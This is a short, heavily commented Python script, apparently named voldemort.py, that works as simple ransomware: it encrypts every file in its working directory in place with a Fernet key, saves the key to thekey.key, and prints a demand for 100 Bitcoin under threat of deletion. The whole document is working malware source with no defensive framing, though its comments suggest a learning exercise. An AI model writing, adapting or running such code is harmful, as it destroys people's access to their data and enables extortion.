#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet          #Fernet is a symmetric encryption method to avoid manipulation/reading without the key

files = []      #creates a list called files

for file in os.listdir():
        if file =="voldemort.py" or file == "thekey.key" or file=="decrypt.py": #prevents to add voldemort.py,thekey, and decrypt.py to the list of encripted files
                continue
        if os.path.isfile(file):        #it will only add files, not directories to the "files" list
                files.append(file)

key = Fernet.generate_key()     #variable key will hold the randomly generated key created by Fernet

with open("thekey.key","wb") as thekey:         #creation of a file with the write mode as a binary (wb) file to hold the key
        thekey.write(key)                       #writes the key

for file in files:
        with open(file, "rb") as thefile:       #open the files that are going to be destroyed  with the read mode as a binary file (rb)
                contents = thefile.read()       #creation of a variable that holds the contents of thefile (encripted files)
        contents_encrypted = Fernet(key).encrypt(contents) # encryption of the content of the files in "contents" using the key
        with open(file , "wb") as thefile:      #opens the files in write binary mode (wb) to write the encrypted contents to the files
                thefile.write(contents_encrypted)       #writes contents_encrypted to thefile (every file to be destroyed)

print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hours")